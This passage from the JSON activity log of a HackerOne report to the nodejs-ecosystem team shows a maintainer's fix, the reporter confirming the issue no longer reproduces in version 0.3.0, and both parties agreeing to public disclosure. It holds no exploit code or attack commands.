administrator.\u0026lt;/div\u0026gt;\n* Connection #0 to host localhost left intact\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFurther comments or issues, please open a new issue in the repository. \u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nJose.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-05T14:44:17.589Z","updated_at":"2018-03-05T14:44:17.589Z","actor":{"username":"jmjuanes","cleared":false,"url":"/jmjuanes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2460221,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jmjuanes ,\n\nThanks for the fix! Looks good to me :)\n\n@lirantal - I can confirm issue is not reproducible in 0.3.0 :)\n\nbl4de","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jmjuanes\"\u003e@jmjuanes\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThanks for the fix! Looks good to me :)\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e - I can confirm issue is not reproducible in 0.3.0 :)\u003c/p\u003e\n\n\u003cp\u003ebl4de\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-05T16:19:27.098Z","updated_at":"2018-03-05T16:19:27.098Z","actor":{"username":"bl4de","cleared":false,"url":"/bl4de","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2461287,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great stuff guys, thanks!\n@jmjuanes @bl4de are you both ok if I proceed with a full public disclosure of the report?","markdown_message":"\u003cp\u003eGreat stuff guys, thanks!\u003cbr\u003e\n\u003ca href=\"/jmjuanes\"\u003e@jmjuanes\u003c/a\u003e \u003ca href=\"/bl4de\"\u003e@bl4de\u003c/a\u003e are you both ok if I proceed with a full public disclosure of the report?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-05T19:35:02.122Z","updated_at":"2018-03-05T19:35:02.122Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2461289,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-05T19:35:19.747Z","updated_at":"2018-03-05T19:35:19.747Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bl4de","url":"/bl4de"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2461290,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-05T19:35:26.982Z","updated_at":"2018-03-05T19:35:26.982Z","first_to_agree":true,"actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2463794,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@lirantal Yes, please :)","markdown_message":"\u003cp\u003e\u003ca href=\"/lirantal\"\u003e@lirantal\u003c/a\u003e Yes, please :)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-06T12:08:12.017Z","updated_at":"2018-03-06T12:08:12.017Z","actor":{"username":"jmjuanes","cleared":false,"url":"/jmjuanes","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2465508,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-06T22:04:34.201Z","updated_at":"2018-03-06T22:04:34.201Z","actor":{"username":"lirantal","cleared":false,"url":"/lirantal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}